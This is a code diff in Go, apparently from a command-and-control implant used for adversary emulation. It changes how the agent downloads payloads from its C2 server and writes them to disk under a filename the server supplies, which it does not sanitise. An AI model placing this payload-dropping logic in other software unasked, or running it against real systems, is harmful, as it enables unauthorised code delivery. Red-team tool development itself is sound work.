@@ -228,30 +228,33 @@ func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
 	availablePayloads := reflect.ValueOf(payloads)
 	for i := 0; i < availablePayloads.Len(); i++ {
 		payload := availablePayloads.Index(i).Elem().String()
-		location := filepath.Join(payload)
-		if !fileExists(location) {
-			if err := a.WritePayloadToDisk(payload, location); err != nil {
-				output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
-				continue
-			}
+		location, err := a.WritePayloadToDisk(payload)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
+			continue
 		}
 		droppedPayloads = append(droppedPayloads, location)
 	}
 	return droppedPayloads
 }
 
-// Will download the specified payload and write it to disk at the specified location.
-// Assumes file does not already exist.
-func (a *Agent) WritePayloadToDisk(payload string, location string) error {
-	payloadBytes := a.FetchPayloadBytes(payload)
-	if len(payloadBytes) > 0 {
-		return writePayloadBytes(location, payloadBytes)
+// Will download the specified payload and write it to disk using the filename provided by the C2.
+// Returns the C2-provided filename or error.
+func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
+	payloadBytes, filename := a.FetchPayloadBytes(payload)
+	if len(payloadBytes) > 0 && len(filename) > 0 {
+		location := filepath.Join(filename)
+		if !fileExists(location) {
+			return location, writePayloadBytes(location, payloadBytes)
+		}
+		output.VerbosePrint(fmt.Sprintf("[*] File %s already exists", filename))
+		return location, nil
 	}
-	return errors.New("Failed to fetch payload bytes.")
+	return "", errors.New(fmt.Sprintf("Failed to fetch payload bytes for payload %s",payload))
 }
 
 // Will request payload bytes from the C2 for the specified payload and return them.
-func (a *Agent) FetchPayloadBytes(payload string) []byte {
+func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
 	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes: %s", payload))
 	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
 }
